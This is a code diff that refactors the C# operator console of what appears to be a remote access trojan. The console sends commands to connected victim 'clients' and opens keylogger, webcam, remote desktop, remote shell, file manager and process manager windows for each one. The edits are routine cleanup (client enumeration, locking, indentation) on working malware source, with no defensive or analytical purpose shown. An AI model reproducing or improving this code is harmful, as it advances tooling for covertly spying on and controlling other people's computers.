@@ -243,9 +243,8 @@ namespace Server
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "Ping";
                 msgpack.ForcePathObject("Message").AsString = "This is a ping!";
-                foreach (ListViewItem itm in listView1.Items)
+                foreach (Clients client in GetAllClients())
                 {
-                    Clients client = (Clients)itm.Tag;
                     ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
                 GC.Collect();
@@ -255,26 +254,22 @@ namespace Server
         private void UpdateUI_Tick(object sender, EventArgs e)
         {
             Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
-            toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
+            lock (Settings.LockListviewClients)
+                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
         }
 
         private void GetThumbnails_Tick(object sender, EventArgs e)
         {
-            if (listView1.Items.Count > 0)
+            try
             {
-                try
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "thumbnails";
+                foreach (Clients client in GetAllClients())
                 {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "thumbnails";
-
-                    foreach (ListViewItem itm in listView1.Items)
-                    {
-                        Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                    }
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
-                catch { }
             }
+            catch { }
         }
 
         #endregion
@@ -663,20 +658,20 @@ namespace Server
                 msgpack.ForcePathObject("Quality").AsInteger = 30;
                 foreach (Clients client in GetSelectedClients())
                 {
-                        FormRemoteDesktop remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
-                        if (remoteDesktop == null)
+                    FormRemoteDesktop remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
+                    if (remoteDesktop == null)
+                    {
+                        remoteDesktop = new FormRemoteDesktop
                         {
-                            remoteDesktop = new FormRemoteDesktop
-                            {
-                                Name = "RemoteDesktop:" + client.ID,
-                                F = this,
-                                Text = "RemoteDesktop:" + client.ID,
-                                ParentClient = client,
-                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
-                            };
-                            remoteDesktop.Show();
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
+                            Name = "RemoteDesktop:" + client.ID,
+                            F = this,
+                            Text = "RemoteDesktop:" + client.ID,
+                            ParentClient = client,
+                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
+                        };
+                        remoteDesktop.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
                 }
             }
             catch { }
@@ -691,19 +686,19 @@ namespace Server
                 msgpack.ForcePathObject("isON").AsString = "true";
                 foreach (Clients client in GetSelectedClients())
                 {
-                        FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
-                        if (KL == null)
+                    FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
+                    if (KL == null)
+                    {
+                        KL = new FormKeylogger
                         {
-                            KL = new FormKeylogger
-                            {
-                                Name = "keyLogger:" + client.ID,
-                                Text = "keyLogger:" + client.ID,
-                                F = this,
-                                Client = client
-                            };
-                            KL.Show();
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
+                            Name = "keyLogger:" + client.ID,
+                            Text = "keyLogger:" + client.ID,
+                            F = this,
+                            Client = client
+                        };
+                        KL.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
                 }
             }
             catch { }
@@ -715,18 +710,18 @@ namespace Server
             {
                 foreach (Clients client in GetSelectedClients())
                 {
-                        FormChat shell = (FormChat)Application.OpenForms["chat:" + client.ID];
-                        if (shell == null)
+                    FormChat shell = (FormChat)Application.OpenForms["chat:" + client.ID];
+                    if (shell == null)
+                    {
+                        shell = new FormChat
                         {
-                            shell = new FormChat
-                            {
-                                Name = "chat:" + client.ID,
-                                Text = "chat:" + client.ID,
-                                F = this,
-                                Client = client
-                            };
-                            shell.Show();
-                        }
+                            Name = "chat:" + client.ID,
+                            Text = "chat:" + client.ID,
+                            F = this,
+                            Client = client
+                        };
+                        shell.Show();
+                    }
                 }
             }
             catch { }
@@ -741,20 +736,20 @@ namespace Server
                 msgpack.ForcePathObject("Command").AsString = "getDrivers";
                 foreach (Clients client in GetSelectedClients())
                 {
-                        FormFileManager fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
-                        if (fileManager == null)
+                    FormFileManager fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                    if (fileManager == null)
+                    {
+                        fileManager = new FormFileManager
                         {
-                            fileManager = new FormFileManager
-                            {
-                                Name = "fileManager:" + client.ID,
-                                Text = "fileManager:" + client.ID,
-                                F = this,
-                                Client = client,
-                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
-                            };
-                            fileManager.Show();
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
+                            Name = "fileManager:" + client.ID,
+                            Text = "fileManager:" + client.ID,
+                            F = this,
+                            Client = client,
+                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
+                        };
+                        fileManager.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
                 }
             }
             catch { }
@@ -787,19 +782,19 @@ namespace Server
                 msgpack.ForcePathObject("Option").AsString = "List";
                 foreach (Clients client in GetSelectedClients())
                 {
-                        FormProcessManager processManager = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
-                        if (processManager == null)
+                    FormProcessManager processManager = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
+                    if (processManager == null)
+                    {
+                        processManager = new FormProcessManager
                         {
-                            processManager = new FormProcessManager
-                            {
-                                Name = "processManager:" + client.ID,
-                                Text = "processManager:" + client.ID,
-                                F = this,
-                                Client = client
-                            };
-                            processManager.Show();
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
+                            Name = "processManager:" + client.ID,
+                            Text = "processManager:" + client.ID,
+                            F = this,
+                            Client = client
+                        };
+                        processManager.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
                 }
             }
             catch { }
@@ -1024,19 +1019,19 @@ namespace Server
                 msgpack.ForcePathObject("Packet").AsString = "shell";
                 foreach (Clients client in GetSelectedClients())
                 {
-                        FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
-                        if (shell == null)
+                    FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
+                    if (shell == null)
+                    {
+                        shell = new FormShell
                         {
-                            shell = new FormShell
-                            {
-                                Name = "shell:" + client.ID,
-                                Text = "shell:" + client.ID,
-                                F = this,
-                                Client = client
-                            };
-                            shell.Show();
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
+                            Name = "shell:" + client.ID,
+                            Text = "shell:" + client.ID,
+                            F = this,
+                            Client = client
+                        };
+                        shell.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
                 }
             }
             catch { }
@@ -1184,20 +1179,20 @@ namespace Server
                 msgpack.ForcePathObject("Command").AsString = "getWebcams";
                 foreach (Clients client in GetSelectedClients())
                 {
-                        FormWebcam remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
-                        if (remoteDesktop == null)
+                    FormWebcam remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
+                    if (remoteDesktop == null)
+                    {
+                        remoteDesktop = new FormWebcam
                         {
-                            remoteDesktop = new FormWebcam
-                            {
-                                Name = "Webcam:" + client.ID,
-                                F = this,
-                                Text = "Webcam:" + client.ID,
-                                ParentClient = client,
-                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
-                            };
-                            remoteDesktop.Show();
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
+                            Name = "Webcam:" + client.ID,
+                            F = this,
+                            Text = "Webcam:" + client.ID,
+                            ParentClient = client,
+                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
+                        };
+                        remoteDesktop.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
                 }
             }
             catch { }
